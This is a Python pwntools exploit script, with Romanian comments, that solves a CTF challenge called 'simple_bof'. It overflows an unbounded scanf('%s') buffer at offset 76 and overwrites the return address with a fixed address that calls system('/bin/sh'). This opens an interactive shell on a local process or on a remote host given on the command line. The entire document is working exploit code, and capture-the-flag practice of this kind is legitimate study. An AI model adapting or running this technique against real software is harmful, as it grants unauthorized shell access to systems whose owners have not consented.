#!/usr/bin/env python3
# ============================================================================
# CTF: simple_bof — ret2win / ret2system (stack BOF)
# Vulnerabilitate: scanf("%s") fara limita => overflow (offset 76) peste return
#   address. Binarul importa system() si contine "/bin/sh"; exista secventa
#   push $0x804a009 ("/bin/sh"); call system@plt la 0x080492db => ret acolo = shell.
# Binar: ELF 32-bit (i386), STRIPPED · No-PIE | NX on · fara canary · Partial RELRO
#   - Stripped => fara simboluri, adresa gadgetului gasita manual din dezasamblare.
#     Fara canary => overflow direct. No-PIE => 0x080492db e adresa fixa. NX irelevant.
# ============================================================================
from pwn import *

context.binary = elf = ELF('./simple_bof')

def connect():
    # remote doar daca ai dat HOST + PORT numeric; altfel proces local
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./simple_bof')

p = connect()

WIN     = 0x080492db    # push "/bin/sh"; call system@plt

payload = b'A' * 76 + p32(WIN)

p.recvuntil(b"Give me one good apple, please!")
p.sendline(payload)

p.interactive()